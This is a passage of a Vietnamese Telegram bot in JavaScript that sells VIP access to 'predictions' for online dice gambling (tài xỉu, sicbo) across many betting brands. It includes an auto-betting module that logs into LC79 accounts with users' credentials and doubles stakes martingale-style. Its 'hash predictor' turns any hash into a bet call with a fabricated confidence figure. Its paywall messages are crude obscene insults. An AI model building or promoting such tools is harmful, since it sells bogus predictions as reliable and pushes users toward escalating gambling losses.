  const phien = getVal(item, ['Phien', 'phien', 'session', 'id', 'Phien_hien_tai']);
  if (phien == null) return null;

  let ket = getVal(item, ['Ket_qua', 'ket_qua', 'result', 'KetQua', 'kq']) || '';
  try { ket = decodeURIComponent(ket); } catch {}

  const xucxacArr = getVal(item, ['xuc_xac', 'Xuc_xac', 'dice']);
  let d1 = 0, d2 = 0, d3 = 0;
  if (Array.isArray(xucxacArr) && xucxacArr.length >= 3) {
    d1 = Number(xucxacArr[0]) || 0; d2 = Number(xucxacArr[1]) || 0; d3 = Number(xucxacArr[2]) || 0;
  } else {
    d1 = Number(getVal(item, ['Xuc_xac_1', 'xuc_xac_1', 'dice1'])) || 0;
    d2 = Number(getVal(item, ['Xuc_xac_2', 'xuc_xac_2', 'dice2'])) || 0;
    d3 = Number(getVal(item, ['Xuc_xac_3', 'xuc_xac_3', 'dice3'])) || 0;
  }

  let sum = Number(getVal(item, ['Tong', 'tong', 'total', 'sum']));
  if (!Number.isFinite(sum) || sum <= 0) sum = d1 + d2 + d3;

  const k = String(ket).toLowerCase();
  let side = 'X';
  if (k.includes('tài') || k.includes('tai') || k === 't') side = 'T';
  else if (k.includes('xỉu') || k.includes('xiu') || k === 'x') side = 'X';
  else if (sum > 0) side = sum >= 11 ? 'T' : 'X';

  return { session: String(phien), side, sum, dice: [d1, d2, d3] };
}

async function fetchJson(url, timeout = 8000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeout);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': 'Mozilla/5.0 DUDOANTX/14' } });
    clearTimeout(t);
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return await res.json();
  } catch (e) { clearTimeout(t); throw e; }
}

const health = {};
async function pollGame(g) {
  const f = FEEDS[g.id];
  if (!f || !g.enabled || !g.url) return;
  const h = health[g.id] || (health[g.id] = { fails: 0, next: 0 });
  if (h.next && Date.now() < h.next) return;

  try {
    const raw = await fetchJson(g.url, 8000);
    const live = parseLive(raw);
    if (!live) throw new Error('parse_failed');

    if (live.session && live.session !== f.lastSession) {
      f.engine.push(live.side, live.sum, live.dice, live.session);
      f.lastSession = live.session;
      f.lastPred = f.engine.predict();
      saveLearningSnapshot();
    } else if (!f.lastSession) {
      f.engine.push(live.side, live.sum, live.dice, live.session);
      f.lastSession = live.session || ('t' + Date.now());
      f.lastPred = f.engine.predict();
    } else if (!f.lastPred) f.lastPred = f.engine.predict();

    f.lastLive = live; f.lastError = null;
    h.fails = 0; h.next = 0;
  } catch (e) {
    h.fails++;
    h.next = Date.now() + Math.min(300000, 5000 * Math.pow(2, Math.min(5, h.fails - 1)));
    f.lastError = String(e.message || e).slice(0, 80);
  }
}

async function pollAll() { await Promise.all(games.map(g => (g.enabled === false ? Promise.resolve() : pollGame(g).catch(() => {})))); }
setInterval(pollAll, POLL_MS);
setTimeout(pollAll, 1500);

function saveLearningSnapshot() {
  try {
    const snap = {};
    for (const id of Object.keys(FEEDS)) {
      const e = FEEDS[id].engine;
      snap[id] = {
        history: e.history.slice(-300), sums: e.sums.slice(-300),
        correct: e.correct, total: e.total, log: e.log.slice(-200)
      };
    }
    saveJSON('learning.json', snap);
  } catch {}
}
function loadLearningSnapshot() {
  const snap = loadJSON('learning.json', null);
  if (!snap) return;
  for (const id of Object.keys(snap)) {
    if (!FEEDS[id]) continue;
    const s = snap[id];
    if (!Array.isArray(s.history) || !Array.isArray(s.sums)) continue;
    const fresh = new Engine(id);
    for (let i = 0; i < s.history.length; i++) {
      fresh.push(s.history[i], s.sums[i] || 10, null, null);
      fresh.pending = null; fresh.pendingMeta = null;
    }
    fresh.correct = Number(s.correct) || 0;
    fresh.total = Number(s.total) || 0;
    if (Array.isArray(s.log)) fresh.log = s.log.slice();
    FEEDS[id].engine = fresh;
  }
}
loadLearningSnapshot();

/* ═══════════════ LC79 AUTO-BET ═══════════════ */
const LC79 = { sessions: {}, MIN_CONF: 55, MAX_MARTINGALE: 6, MARTINGALE_MULT: 2 };

async function lc79Fetch(url, timeout = 15000, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeout);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal, method: opts.method || 'GET',
      headers: { 'User-Agent': 'Mozilla/5.0 DUDOANTX/14', ...(opts.headers || {}) },
      body: opts.body
    });
    clearTimeout(t);
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return await res.json();
  } catch (e) { clearTimeout(t); throw e; }
}

async function lc79Login(username, password) {
  const md5 = crypto.createHash('md5').update(password).digest('hex');
  const r1 = await lc79Fetch(`https://apifo88daigia.tele68.com/api?c=3&un=${encodeURIComponent(username)}&pw=${md5}&cp=R&cl=R&pf=web&at=`);
  if (!r1 || !r1.success) throw new Error('Sai tài khoản / mật khẩu');
  const sk = r1.sessionKey + '='.repeat((4 - r1.sessionKey.length % 4) % 4);
  const nickname = JSON.parse(Buffer.from(sk, 'base64').toString()).nickname;
  const r2 = await lc79Fetch('https://wlb.tele68.com/v1/lobby/auth/login?cp=R&cl=R&pf=web&at=', 15000, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ nickName: nickname, accessToken: r1.accessToken })
  });
  if (!r2 || !r2.token) throw new Error('Không nhận được token');
  return { token: r2.token, nickname, money: (r2.remoteLoginResp && r2.remoteLoginResp.money) || 0 };
}

async function lc79LoadHistory(limit = 100) {
  try {
    const r = await lc79Fetch('https://wtxmd52.tele68.com/v1/txmd5/sessions', 12000);
    if (!r || !Array.isArray(r.list)) return [];
    const arr = r.list.slice().sort((a, b) => a.id - b.id);
    const out = [];
    for (const it of arr) {
      const kq = it.resultTruyenThong;
      if (kq !== 'TAI' && kq !== 'XIU') continue;
      const dice = Array.isArray(it.dices) ? it.dices : [0, 0, 0];
      out.push({
        session: String(it.id),
        side: kq === 'TAI' ? 'T' : 'X',
        sum: Number(it.point) || dice.reduce((a, b) => a + b, 0),
        dice
      });
    }
    return out.slice(-limit);
  } catch { return []; }
}

function lc79BetAmount(uid) {
  const s = LC79.sessions[uid];
  if (!s) return 0;
  if (!s.martingale) return s.baseBet;
  return s.baseBet * Math.pow(LC79.MARTINGALE_MULT, Math.min(s.martingaleLevel, LC79.MAX_MARTINGALE));
}

function lc79Stop(uid, silent) {
  const s = LC79.sessions[uid];
  if (!s) return;
  try { s.socket && s.socket.disconnect(); } catch {}
  delete LC79.sessions[uid];
  if (!silent && s.chatId) {
    send(s.chatId, '⏹ <b>Đã ngắt kết nối LC79 & đăng xuất</b>\n\n👇 Quay lại bất cứ lúc nào:',
      kb([[btn('🏠 VỀ MENU', 'menu', 'danger')]])).catch(() => {});
  }
}

async function lc79Connect(uid, chatId, data) {
  lc79Stop(uid, true);

  const engine = new Engine('lc79_' + uid);
  const history = await lc79LoadHistory(100);
  for (const h of history) engine.push(h.side, h.sum, h.dice, h.session);
  engine.pending = null; engine.pendingMeta = null;

  const s = {
    uid, chatId, token: data.token, nickname: data.nickname,
    balance: data.money, engine, socket: null,
    autoBet: false, martingale: false, martingaleLevel: 0,
    baseBet: 10000, stopLoss: 0, stopWin: 0,
    profit: 0, wins: 0, losses: 0,
    currentPred: null, currentConf: 0, currentSession: null,
    hasBet: false, history: [], connected: false
  };
  LC79.sessions[uid] = s;

  const socket = io('https://wtxmd52.tele68.com', {
    path: '/txmd5/', transports: ['websocket'],
    auth: { token: data.token },
    extraHeaders: { 'User-Agent': 'Mozilla/5.0', 'Origin': 'https://lc79b.bet' },
    reconnection: true, reconnectionAttempts: 99999, reconnectionDelay: 3000
  });
  s.socket = socket;

  socket.on('connect', () => {
    s.connected = true;
    send(chatId,
`✅ <b>ĐÃ KẾT NỐI LC79</b>

📛 <b>Tài khoản:</b> ${esc(s.nickname)}
💰 <b>Số dư:</b> <b>${fmt(s.balance)}</b> VND
📚 <b>Đã nạp:</b> ${history.length} phiên lịch sử

👇 <i>Bấm nút để điều khiển:</i>`,
    kb([
      [btn('⚙️ MỞ BẢNG ĐIỀU KHIỂN', 'lc79:menu', 'success')],
      [btn('🏠 VỀ MENU', 'menu', 'danger')]
    ]));
  });

  socket.on('new-session', (d) => {
    const st = LC79.sessions[uid]; if (!st) return;
    st.currentSession = String(d.id);
    st.hasBet = false;
    st.currentPred = null;
    st.currentConf = 0;
    if (st.engine.history.length < 3) return;

    const p = st.engine.predict();
    st.currentPred = p.side;
    st.currentConf = p.conf;
    const icon = p.side === 'T' ? '🔴' : '🔵';
    const txt = p.side === 'T' ? 'TÀI' : 'XỈU';
    const bet = lc79BetAmount(uid);

    send(chatId,
`💎 <b>PHIÊN #${esc(d.id)}</b>

${icon} <b>DỰ ĐOÁN: ${txt}</b>
📊 <b>Độ tin:</b> ${p.conf}%
📊 <b>Cầu:</b> ${cauStr(st.engine.history, 20) || '—'}

💰 <b>Cược:</b> ${fmt(bet)}
💸 <b>X2:</b> ${st.martingale ? '🟢 C' + st.martingaleLevel : '🔴 TẮT'}
⚡ <b>Auto:</b> ${st.autoBet ? '🟢 BẬT' : '🔴 TẮT'}`,
    kb([[btn('⚙️ ĐIỀU KHIỂN', 'lc79:menu', 'primary')]]));
  });

  socket.on('tick-update', (d) => {
    const st = LC79.sessions[uid]; if (!st) return;
    if (d.state !== 'BETTING' || !st.autoBet || !st.currentPred || st.hasBet) return;
    if (st.currentConf < LC79.MIN_CONF) return;
    const amount = lc79BetAmount(uid);
    try {
      socket.emit('bet', { type: st.currentPred, amount });
      st.hasBet = true;
      send(chatId, `🚀 <b>ĐẶT CƯỢC</b>\n${st.currentPred === 'T' ? '🔴 TÀI' : '🔵 XỈU'} • <b>${fmt(amount)}</b>`);
    } catch {}
  });

  socket.on('bet-result', (d) => {
    const st = LC79.sessions[uid];
    if (st && d && d.postBalance != null) st.balance = d.postBalance;
  });

  socket.on('session-result', (d) => {
    const st = LC79.sessions[uid]; if (!st) return;
    const kq = d.resultTruyenThong;
    if (kq !== 'TAI' && kq !== 'XIU') return;
    const side = kq === 'TAI' ? 'T' : 'X';
    const dice = Array.isArray(d.dices) ? d.dices : [];
    const sum = dice.reduce((a, b) => a + b, 0);

    st.engine.push(side, sum, dice, String(d.id));

    if (st.currentPred) {
      const win = st.currentPred === side;
      const bet = lc79BetAmount(uid);
      if (win) { st.wins++; st.profit += bet; st.martingaleLevel = 0; }
      else {
        st.losses++; st.profit -= bet;
        if (st.martingale && st.martingaleLevel < LC79.MAX_MARTINGALE) st.martingaleLevel++;
      }
      st.history.push({ session: String(d.id), dice, sum, actual: side, pred: st.currentPred, win, bet });
      if (st.history.length > 100) st.history.shift();

      const total = st.wins + st.losses;
      const wr = total ? Math.round(st.wins / total * 100) : 0;

      send(chatId,
`🎲 <b>#${esc(d.id)}</b> → ${kq === 'TAI' ? '🔴 TÀI' : '🔵 XỈU'} • Tổng <b>${sum}</b> 🎲${dice.join('-')}
${win ? '✅ <b>THẮNG</b>' : '❌ <b>THUA</b>'} • 💵 <b>${st.profit >= 0 ? '+' : ''}${fmt(st.profit)}</b>
🔥${st.wins} 💀${st.losses} • 📊 ${wr}% • 💼 ${fmt(st.balance)}`);

      if (st.autoBet && st.stopLoss > 0 && st.profit <= -st.stopLoss) {
        st.autoBet = false;
        send(chatId,
`🛑 <b>CHẠM STOP LOSS!</b>

💸 Lỗ: <b>${fmt(st.profit)}</b>
⚡ Auto <b>ĐÃ TỰ TẮT</b> để bảo toàn vốn.`,
        kb([[btn('⚙️ ĐIỀU KHIỂN', 'lc79:menu', 'primary')]]));
      } else if (st.autoBet && st.stopWin > 0 && st.profit >= st.stopWin) {
        st.autoBet = false;
        send(chatId,
`🏆 <b>CHẠM STOP WIN!</b>

💰 Lãi: <b>+${fmt(st.profit)}</b>
⚡ Auto <b>ĐÃ TỰ TẮT</b> — chốt lời thành công! 🎉`,
        kb([[btn('⚙️ ĐIỀU KHIỂN', 'lc79:menu', 'primary')]]));
      }
    }
  });
}

/* ═══════════════ HASH PREDICTOR ═══════════════ */
function predictHash(hashStr) {
  const str = hashStr.toLowerCase();
  let sum = 0;
  for (let i = 0; i < str.length; i++) sum += str.charCodeAt(i) * (i + 1);
  const pseudo = (sum * 9301 + 49297) % 233280 / 233280;
  const side = pseudo >= 0.5 ? 'T' : 'X';
  const conf = Math.round(55 + Math.abs(pseudo - 0.5) * 80);
  const reason = pseudo >= 0.5 ? '🔴 Hash nghiêng Tài' : '🔵 Hash nghiêng Xỉu';
  return { side, conf, reason };
}

/* ═══════════════ EXPORT HISTORY (FIXED v14.3) ═══════════════ */
async function exportHistory(chatId, gameId) {
  const g = games.find(x => x.id === gameId);
  const f = FEEDS[gameId];
  if (!g || !f) return send(chatId, '❌ Éo tìm thấy bàn.');

  const sicbo = isSicboGame(g);
  const eng = f.engine;

  let logs = eng.log.slice(-20).reverse();

  if (!logs.length && eng.history.length > 0) {
    const n = eng.history.length;
    const take = Math.min(20, n);
    const hLast = eng.history.slice(-take);
    const sLast = eng.sums.slice(-take);
    const dLen = eng.diceHist.length;
    const dLast = dLen ? eng.diceHist.slice(-Math.min(take, dLen)) : [];
    const dOffset = dLast.length - take;

    logs = [];
    for (let i = take - 1; i >= 0; i--) {
      const dIdx = i + dOffset;
      logs.push({
        session: '—', pred: null,
        actual: hLast[i], ok: null, okVi: null, conf: 0,
        sum: sLast[i] || 0,
        dice: (dIdx >= 0 && dIdx < dLast.length) ? dLast[dIdx] : []
      });
    }
  }

  if (!logs.length) {
    return send(chatId,
`📭 <b>Chưa có dữ liệu phiên nào</b>

⏳ Bot đang lấy dữ liệu từ API (10-30 giây). Đợi xíu rồi bấm lại.`,
    kb([
      [btn('🔄 THỬ LẠI', 'predhist:' + gameId, 'success')],
      [btn('◀️ QUAY LẠI', 'pred:' + gameId, 'primary')]
    ]));
  }

  const lines = [];
  lines.push(`📜 <b>LỊCH SỬ 20 PHIÊN — ${esc(g.brandLabel)} ${esc(g.variant)}</b>`);
  lines.push(`━━━━━━━━━━━━━━━`);
  lines.push(`⏰ ${nowVN()}`);
  lines.push(`📈 Độ chuẩn: <b>${eng.accuracy()}%</b> (${eng.correct}/${eng.total})`);
  lines.push(`━━━━━━━━━━━━━━━`);

  for (const log of logs) {
    const sess = String(log.session || '—').slice(-8);
    const act = log.actual === 'T' ? '🔴 TÀI' : '🔵 XỈU';
    const dice = (log.dice && log.dice.length >= 3) ? log.dice.join('-') : '—';
    const sum = log.sum || '—';

    let predLine = '';
    if (log.pred) {
      const predSide = log.pred === 'T' ? 'TÀI' : 'XỈU';
      const okStr = log.ok ? '✅' : '❌';
      let viStr = '';
      if (sicbo && log.okVi !== undefined && log.okVi !== null) viStr = log.okVi ? ' 🎯' : ' ⚠️';
      predLine = ` • Dự: ${predSide} (${log.conf || 0}%) ${okStr}${viStr}`;
    }
    lines.push(`<code>#${esc(sess)}</code> ${act} • Tổng <b>${sum}</b> 🎲 ${dice}${predLine}`);
  }

  await send(chatId, lines.join('\n'), kb([
    [btn('🔄 LÀM MỚI', 'predhist:' + gameId, 'success')],
    [btn('◀️ QUAY LẠI CARD', 'pred:' + gameId, 'primary'), btn('🏠 VỀ MENU', 'menu', 'danger')]
  ]));
}

/* ═══════════════ UI HELPERS ═══════════════ */
function kb(rows) { return { reply_markup: { inline_keyboard: rows } }; }
function btn(text, data, style) { return { text, callback_data: data, style }; }
function btnUrl(text, url, style) { return { text, url, style }; }

/* ═══════════════ MENU: USER ═══════════════ */
async function showUserMenu(chatId, from) {
  const uid = uidOf(from);
  const v = vipText(uid);
  const text =
`🔥 <b>ĐỊT CHẾT CỤ NHÀ CÁI</b> 🔥
<i>Tool soi cầu đỉnh cao — bám phiên 24/7.</i>

👤 <b>Đại Ca:</b> ${esc(displayName(from))}
🆔 <b>ID:</b> <code>${uid}</code>
💎 <b>Trạng thái:</b> ${v.line}
⏳ <b>Hạn dùng:</b> <b>${v.expire}</b>

👇 <i>Chọn chức năng:</i>`;

  const rows = [
    [btn('🎯 VÀO SOI CẦU NGAY', 'pred:brands', 'primary')],
    [btn('🤖 AUTO CƯỢC LC79', 'lc79:menu', 'danger')],
    [btn('🧩 TOOL HASH MD5/SHA256', 'hash:start', 'success')],
    [btnUrl('🙋 GỌI ADMIN XIN QUYỀN', cfg.supportUrl, 'success')]
  ];
  if (isAdmin(uid)) rows.push([btn('🛠 BẢNG ĐIỀU KHIỂN ADMIN', 'adm:home', 'danger')]);
  return send(chatId, text, kb(rows));
}

/* ═══════════════ MENU: BRANDS ═══════════════ */
async function showBrandMenu(chatId) {
  const brands = [
    ['sunwin', 'Sunwin'], ['789club', '789 Club'],
    ['b52', 'B52'], ['hitclub', 'Hitclub'],
    ['xocdia88', 'Xóc Đĩa 88'], ['max789', 'Max789'],
    ['lc79', 'LC79'], ['betvip', 'Betvip'],
    ['sumclub', 'Sumclub'], ['luck8', 'Luck8'],
    ['tik88', 'TIK88'], ['68gb', '68GB Bàn Xanh']
  ];
  const rows = []; let row = [];
  for (let i = 0; i < brands.length; i++) {
    row.push(btn(`🎲 ${brands[i][1]}`, 'predbrand:' + brands[i][0], 'primary'));
    if (row.length === 2) { rows.push(row); row = []; }
  }
  if (row.length) rows.push(row);
  rows.push([btn('🏠 VỀ MENU', 'menu', 'danger')]);
  return send(chatId, '📊 <b>TX • DANH SÁCH SÀNH</b>\n\n👇 Chọn sàn muốn xem phiên:', kb(rows));
}

/* ═══════════════ AUTO WATCH ═══════════════ */
function stopAuto(uid, silent) {
  const w = autoWatch[uid]; if (!w) return;
  if (w.timer) clearInterval(w.timer);
  delete autoWatch[uid];
  if (!silent && w.chatId) {
    send(w.chatId, '⏹ <b>Đã tắt bám phiên.</b>',
      kb([[btn('🏠 VỀ MENU', 'menu', 'danger')]])).catch(() => {});
  }
}
function startAuto(uid, chatId, gameId) {
  stopAuto(uid, true);
  const tick = async () => {
    const w = autoWatch[uid]; if (!w || w.gameId !== gameId) return;
    const g = games.find(x => x.id === gameId), f = FEEDS[gameId];
    if (!g || !f) return;
    await pollGame(g).catch(() => {});
    const sess = f.lastLive?.session ? String(f.lastLive.session) : null;
    if (sess && sess !== w.lastSession) {
      w.lastSession = sess;
      await pushPredCard(chatId, gameId, uid, true).catch(() => {});
    }
  };
  autoWatch[uid] = { gameId, chatId, lastSession: null, timer: setInterval(tick, 5000) };
  tick();
}

/* ═══════════════ VIP GATE ═══════════════ */
async function vipGate(chatId) {
  return send(chatId,
`🤬 <b>ĐỊT CỤ MÀY!</b> 🤬

😡 <b>XIN BỐ MÀY ĐI MỚI DÙNG ĐƯỢC BOT!</b> 💩
🖕 Đừng có bấm bấm nữa, muốn soi cầu thì nạp tiền hoặc xin Admin mở quyền! 🚫
🔞 Mày tưởng tool này free chắc? Mơ đi con! 🖕

👇 <i>Bấm vào đây để xin xỏ:</i>`,
  kb([
    [btnUrl('🙋 XIN BỐ MÀY ĐI', cfg.supportUrl, 'danger')],
    [btn('🏠 VỀ MENU', 'menu', 'primary')]
  ]));
}

/* ═══════════════ PREDICTION CARD ═══════════════ */
async function pushPredCard(chatId, gameId, uid, fromAuto) {
  if (!isVip(uid)) return vipGate(chatId);

  const g = games.find(x => x.id === gameId), f = FEEDS[gameId];
  if (!g || !f) return;
  if (!f.lastPred) f.lastPred = f.engine.predict();
  const p = f.lastPred;
  const sicbo = isSicboGame(g);

  if (sicbo) {
    const pool = p.side === 'T' ? [11, 12, 13, 14, 15, 16, 17] : [4, 5, 6, 7, 8, 9, 10];
    const viSum = (Array.isArray(p.vi) && p.vi.length === 3) ? p.vi[0] + p.vi[1] + p.vi[2] : 0;
    const viValid = Array.isArray(p.vi) && p.vi.length === 3 && p.vi.every(v => v >= 1 && v <= 6) && pool.includes(viSum);
    if (!viValid) {
      p.vi = pickVi(p.side, f.engine.sums, f.engine.diceHist, f.engine.sicbo);
    }
  }

  const live = f.lastLive || {};
  const sideTxt = p.side === 'T' ? 'TÀI' : 'XỈU';
  const sideIcon = p.side === 'T' ? '🔴' : '🔵';
  const acc = f.engine.accuracy();

  const lastLog = f.engine.log.slice(-1)[0];
  let lastResult = '⏳ Chưa có';
  let viResult = '';
  if (lastLog) {
    const okStr = lastLog.ok ? '✅ ĐÚNG' : '❌ SAI';
    const predTxt = lastLog.pred === 'T' ? 'TÀI' : 'XỈU';
    const actTxt = lastLog.actual === 'T' ? 'TÀI' : 'XỈU';
    lastResult = `${okStr} <i>(Dự: ${predTxt} — Ra: ${actTxt})</i>`;
    if (sicbo && lastLog.okVi !== undefined && lastLog.okVi !== null) {
      viResult = lastLog.okVi ? ' | ✅ TRÚNG VỊ' : ' | ❌ TRƯỢT VỊ';
    }
  }

  let nextSession = '—';
  if (live.session != null && live.session !== '') {
    const num = Number(live.session);
    nextSession = Number.isFinite(num) ? String(num + 1) : String(live.session);
  }

  let spec = '';
  if (sicbo) {
    const vi = (p.vi || []).join(' - ');
    spec = `🎲 <b>Dự đoán Sicbo:</b> ${sideIcon} <b>${sideTxt}</b>\n🎯 <b>Vị gợi ý:</b> ${esc(vi)}\n\n`;
  } else {
    spec = `📈 <b>Dự đoán:</b> ${sideIcon} <b>${sideTxt}</b>\n`;
  }

  const text =
`${fromAuto ? '🔄 <i>Auto cập nhật...</i>\n' : ''}🔺🟩 <b>${esc(g.brandLabel)} • ${esc(g.variant)}</b> 🔺🟩
━━━━━━━━━━━━━━━
📦 <b>Phiên hiện tại:</b> <code>#${esc(nextSession)}</code>
${spec}📊 <b>Độ tin cậy:</b> <b>${p.conf}%</b>
━━━━━━━━━━━━━━━
📦 <b>Phiên trước:</b> <code>#${esc(live.session || '---')}</code>
⚖️ <b>Kết quả:</b> ${lastResult}${viResult}
🎲 <b>Xúc xắc:</b> ${live.dice ? live.dice.join(' - ') : '---'}
━━━━━━━━━━━━━━━
📊 <b>Cầu 20 phiên:</b> ${cauStr(f.engine.history, 20) || '—'}
━━━━━━━━━━━━━━━
📈 <b>Tỉ lệ chuẩn:</b> ${acc}% (${f.engine.correct}/${f.engine.total})
🕐 <i>${esc(nowVN())}</i>`;

  const rows = [
    [btn('🔄 LÀM MỚI', 'pred:' + gameId, 'success'), btn('📜 LỊCH SỬ', 'predhist:' + gameId, 'primary')],
    [btn('⏹ DỪNG CẬP NHẬT', 'pred:stop:' + g.id, 'danger')],
    [btn('🎲 CHỌN GAME KHÁC', 'pred:brands', 'primary')]
  ];

  const key = uid + ':' + gameId;
  if (predMsg[key]) await delMsg(chatId, predMsg[key]);
  const sent = await send(chatId, text, kb(rows));
  if (sent && sent.result) predMsg[key] = sent.result.message_id;
}

/* ═══════════════ MENU: TABLES ═══════════════ */
async function showTables(chatId, brand, uid) {
  if (!isVip(uid)) return vipGate(chatId);

  const list = games.filter(g => String(g.brand).toLowerCase() === String(brand).toLowerCase());
  if (!list.length) return send(chatId, '📭 Sòng này éo có bàn nào.',
    kb([[btn('◀️ QUAY LẠI', 'pred:brands', 'primary')]]));

  const rows = []; let row = []; let t = true;
  for (const g of list) {
    const f = FEEDS[g.id], bad = !g.url || g.enabled === false || (f && f.lastError);
    row.push(btn(`${bad ? '🔴' : '🟢'} ${g.variant}`, bad ? 'pred:off:' + g.id : 'pred:' + g.id, bad ? 'danger' : (t ? 'success' : 'primary')));
    t = !t;
    if (row.length === 2) { rows.push(row); row = []; }
  }
  if (row.length) rows.push(row);
  rows.push([btn('◀️ CHỌN SÀNH KHÁC', 'pred:brands', 'primary'), btn('🏠 VỀ MENU', 'menu', 'danger')]);

  return send(chatId, `🎰 <b>SÀNH ${esc(brand.toUpperCase())}</b>\n👇 Chọn bàn mà cày:`, kb(rows));
}

async function sendPredCard(chatId, gameId, uid) {
  if (!isVip(uid)) return vipGate(chatId);

  const g = games.find(x => x.id === gameId), f = FEEDS[gameId];
  if (!g || !f) return send(chatId, '❌ Éo tìm thấy bàn.');
  if (!g.url || g.enabled === false) {
    return send(chatId, '🔴 Bàn này đang bảo trì, kiếm bàn khác đi.',
      kb([[btn('◀️ QUAY LẠI', 'predbrand:' + g.brand, 'primary')]]));
  }

  const loading = await send(chatId, '⏳ <i>Đang kết nối API lấy phiên mới...</i>');
  await pollGame(g).catch(() => {});
  if (!f.lastPred) f.lastPred = f.engine.predict();
  if (loading && loading.result) await delMsg(chatId, loading.result.message_id);

  startAuto(uid, chatId, gameId);
  await pushPredCard(chatId, gameId, uid, true);
}

/* ═══════════════ HASH TOOL ═══════════════ */
async function showHashTool(chatId) {
  return send(chatId,
`🧩 <b>TOOL HASH MD5/SHA256</b> 🧩

😎 Bố mày sẽ đọc mã Hash của mày và phân tích xem nên đập Tài hay Xỉu.

👉 <i>Hãy nhắn (gửi) mã Hash vào đây:</i>
(MD5 dài 32 ký tự, SHA256 dài 64 ký tự)

💡 Gửi liên tục nhiều mã đều được, không cần bấm nút!`,
  kb([[btn('🏠 THOÁT TOOL HASH', 'menu', 'danger')]]));
}

/* ═══════════════ MENU: LC79 ═══════════════ */
async function showLc79Menu(chatId, uid) {
  const s = LC79.sessions[uid];

  if (!s) {
    return send(chatId,
`🤖 <b>AUTO CƯỢC LC79</b>

🔐 <b>Bạn chưa đăng nhập</b>

Bấm nút bên dưới để đăng nhập tài khoản LC79 thật.
Bot sẽ tự dùng <b>bộ não chung</b> phân tích cầu và đặt cược hộ mày.

⚠️ <i>Chỉ LC79 hỗ trợ auto cược — các sàn khác vẫn chỉ soi cầu.</i>`,
    kb([
      [btn('🔐 ĐĂNG NHẬP LC79', 'lc79:login', 'success')],
      [btn('🏠 VỀ MENU', 'menu', 'danger')]
    ]));
  }

  const total = s.wins + s.losses;
  const wr = total ? Math.round(s.wins / total * 100) : 0;

  return send(chatId,
`🤖 <b>AUTO CƯỢC LC79</b>
━━━━━━━━━━━━━━━
📛 <b>${esc(s.nickname)}</b> • 💰 <b>${fmt(s.balance)}</b>
⚡ Auto: ${s.autoBet ? '🟢 BẬT' : '🔴 TẮT'} • 💸 X2: ${s.martingale ? '🟢 C' + s.martingaleLevel : '🔴 TẮT'}
💰 Cược: <b>${fmt(s.baseBet)}</b> • 🎯 SL: ${s.stopLoss > 0 ? fmt(s.stopLoss) : 'OFF'} • 🏆 SW: ${s.stopWin > 0 ? fmt(s.stopWin) : 'OFF'}
━━━━━━━━━━━━━━━
💵 <b>${s.profit >= 0 ? '+' : ''}${fmt(s.profit)}</b> • 🔥${s.wins} 💀${s.losses} • 📊 ${wr}%`,
  kb([
    [btn(s.autoBet ? '🔴 TẮT AUTO' : '🟢 BẬT AUTO', 'lc79:auto', s.autoBet ? 'danger' : 'success'),
     btn(s.martingale ? '🔴 TẮT X2' : '💸 BẬT X2', 'lc79:x2', s.martingale ? 'danger' : 'success')],
    [btn('⚙️ CÀI ĐẶT', 'lc79:cfg', 'primary'), btn('⏹ THOÁT', 'lc79:stop', 'danger')],
    [btn('🏠 VỀ MENU', 'menu', 'danger')]
  ]));
}

async function showLc79Cfg(chatId, uid) {
  const s = LC79.sessions[uid];
  if (!s) return showLc79Menu(chatId, uid);
  return send(chatId,
`⚙️ <b>CÀI ĐẶT AUTO CƯỢC</b>

💰 Cược gốc: <b>${fmt(s.baseBet)}</b>
🎯 Stop Loss: <b>${s.stopLoss > 0 ? fmt(s.stopLoss) : 'OFF'}</b>
🏆 Stop Win: <b>${s.stopWin > 0 ? fmt(s.stopWin) : 'OFF'}</b>

👇 Bấm nút để đổi:`,
  kb([
    [btn('💰 ĐỔI CƯỢC', 'lc79:set_bet', 'success')],
    [btn('🎯 ĐỔI SL', 'lc79:set_sl', 'primary'), btn('🏆 ĐỔI SW', 'lc79:set_sw', 'primary')],
    [btn('◀️ QUAY LẠI', 'lc79:menu', 'danger')]
  ]));
}

/* ═══════════════ ADMIN ═══════════════ */
async function showAdmin(chatId) {
  const activeVip = Object.values(users).filter(u => u.vipUntil > Date.now()).length;
  return send(chatId,
`🛠 <b>BẢNG ĐIỀU KHIỂN ADMIN</b>

👥 <b>Tổng users:</b> ${Object.keys(users).length}
💎 <b>VIP active:</b> ${activeVip}
🤖 <b>LC79 active:</b> ${Object.keys(LC79.sessions).length}

💡 <i>Cấp quyền:</i> <code>/grant ID Số_Giờ</code>`,
  kb([
    [btn('🎮 QUẢN LÝ GAME', 'adm:games', 'primary'), btn('📣 BẮN THÔNG BÁO', 'adm:bc', 'success')],
    [btn('👤 VỀ MENU USER', 'menu', 'danger')]
  ]));
}

/* ═══════════════ CALLBACKS ═══════════════ */
async function onCallback(cq) {
  const chatId = cq.message.chat.id;
  const msgId = cq.message.message_id;
  const from = cq.from;
  const uid = uidOf(from);
  const data = String(cq.data || '');

  await delMsg(chatId, msgId);
  await answerCb(cq.id);

  if (data === 'menu') {
    stopAuto(uid, true);
    delete sessions[uid];
    return showUserMenu(chatId, from);
  }

  if (data === 'hash:start') {
    if (!isVip(uid)) return vipGate(chatId);
    sessions[uid] = { await: 'hash_input' };
    return showHashTool(chatId);
  }

  if (data.startsWith('lc79:')) {
    if (!isVip(uid) && !isAdmin(uid)) {
      return send(chatId,
`🤬 <b>ĐỊT CỤ MÀY!</b> 🤬

😡 <b>AUTO CƯỢC CHỈ DÀNH CHO VIP!</b> 💩
👇 Xin Admin đi con:`,
      kb([[btnUrl('🙋 XIN QUYỀN', cfg.supportUrl, 'danger')], [btn('🏠 VỀ MENU', 'menu', 'primary')]]));
    }

    const action = data.slice(5);
    const s = LC79.sessions[uid];

    if (action === 'menu') return showLc79Menu(chatId, uid);
    if (action === 'cfg') return showLc79Cfg(chatId, uid);

    if (action === 'login') {
      sessions[uid] = { await: 'lc79_login_user' };
      return send(chatId,
`🔐 <b>ĐĂNG NHẬP LC79</b>

👉 Nhắn <b>TÊN TÀI KHOẢN</b> của mày:`,
      kb([[btn('❌ HỦY', 'lc79:menu', 'danger')]]));
    }

